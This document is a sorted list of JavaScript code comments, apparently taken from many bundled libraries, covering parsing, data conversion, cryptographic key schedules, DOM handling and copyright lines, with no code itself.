// Compile and execute a filtering function if one is not provided
// Compile the JS `FindProxyForURL()` function into an async function.
// Compile the regexp to match each delimiter.
// Compile the script here so that we don't need to create a instance of VMScript.
// Compiled later after NamedNodeMap is all set up.
// Compiling the current (rather than precompilation) source preserves the effects of nonnative source flags
// Complete
// Completely remove old element
// Complex range `r1 || r2 || ...` is a subset of `R1 || R2 || ...` iff:
// ComponentWillUnmount shall only be called once
// Compose partial arguments.
// Compose partial right arguments.
// Composite/text components don't have any built-in ID: we have to make our own
// Computation
// Compute Constants
// Compute HMAC
// Compute constants
// Compute double table
// Compute inv key schedule
// Compute inverse subkeys
// Compute key schedule
// Compute last byte position
// Compute lookup tables
// Compute multiplication
// Compute next LFSR
// Compute next counter
// Compute number of key schedule rows
// Compute number of rounds
// Compute pi index constants
// Compute rho offset constants
// Compute round constants
// Compute sbox
// Compute this*j + x*k (simultaneous multiplication)
// Computed properties can only be used with full notation.
// Computed unit is not pixels. Stop here and return.
// Concat
// Concurrency level
// Condense equivalence converters
// Configure localforage to display NeDB name for now. Would be a good idea to let user use his own app name
// Connect response
// Constants
// Constants for whatToShow
// Constants returned by acceptNode
// Constants returned by startElement and acceptNode
// Constants table
// Constants tables
// Construct high and low argument for squaring
// Construct the array of async function names to add `await` calls to.
// Constructor(TypedArray array)
// Constructor(sequence<type> array)
// Constructor(unsigned long length)
// Consume `import` as an identifier for `import.meta`.
// Consumes a specified amount of bytes from the buffered data.
// Consumes a specified amount of bytes or characters from the buffered data.
// Consumes a specified amount of characters from the buffered data.
// Consumes contextual keyword if possible.
// Content editable or old IE textarea.
// Contents
// Context for global events is callbackContext if it is a DOM node or jQuery collection
// Context to use when determining if on screen
// Context to watch scroll events
// Continuation byte
// Continuous Integration mode
// Convenience version of a common use case of `filter`: selecting only objects
// Convenience version of a common use case of `find`: getting the first object
// Convenience version of a common use case of `map`: fetching a property.
// Conver the blob to a binaryArray and then to a string.
// Convert
// Convert String-formatted options into Object-formatted ones
// Convert UTF-8 strings to hex
// Convert anything to text
// Convert binary arrays to a string and prefix the string with
// Convert buffers to uint8
// Convert dashed to camelCase; used by the css and data modules
// Convert data if not already a string
// Convert each of the elements to its value(s)
// Convert encoding streaming example
// Convert existing expression atom to assignable pattern
// Convert from an encoded buffer to js string.
// Convert from js string to an encoded buffer.
// Convert hash to 32-bit word array before returning
// Convert html into DOM nodes
// Convert list of expression atoms to binding list.
// Convert methods by ary cap.
// Convert no matter what (that way responseXXX fields are always set)
// Convert non-html into a text node
// Convert options from String-formatted to Object-formatted if needed
// Convert other array views to uint8
// Convert our result to an array
// Convert remaining methods.
// Convert response if prev dataType is non-auto and differs from current
// Convert string to CipherParams
// Convert the JavaScript string provided from the user (assumed to be `str` var)
// Convert the input in UCS-2 to Unicode
// Convert the input in UCS-2 to an array of Unicode code points.
// Convert to 32bit integer
// Convert to each sequential dataType
// Convert to pixels if value adjustment is needed
// Convert undefined values to null.
// Converted from big5 work
// Converts a decimal number to hexadecimal
// Converts a hexadecimal number to decimal
// CookieJar configuration:
// Copies a specified amount of bytes from the list of buffered data chunks.
// Copies a specified amount of characters from the list of buffered data
// Copy Safer API
// Copy mapping
// Copy object to make sure that the in param does not get modified between
// Copy one byte at a time
// Copy one word at a time
// Copy options and fill in default values.
// Copy properties from require('buffer')
// Copy sourcesContent into SourceNode
// Copy sourcesContents of applied map.
// Copy static methods from Buffer
// Copy the events from the original to the clone
// Copy the opening '[' or '{'
// Copy the properties one-by-one to the cache object
// Copyright (c) 2005  Tom Wu
// Copyright (c) 2005-2009  Tom Wu
// Copyright (c) 2014-2016 Jonathan Ong me@jongleberry.com and Contributors
// Copyright 2006 Google Inc.
// Copyright 2010-2012 Mikeal Rogers
// Copyright 2011 Mark Cavage <mcavage@gmail.com> All rights reserved.
// Core zlib resets `_handle` to null after attempting to close the
// Correct
// Correct methos
// Couldn't move this check into the 'parseClassMethod' method for backward compatibility.
// Count all documents in the datastore
// Count all of the links from the io.js build page
// Count all planets in the solar system
// Count blocks ready
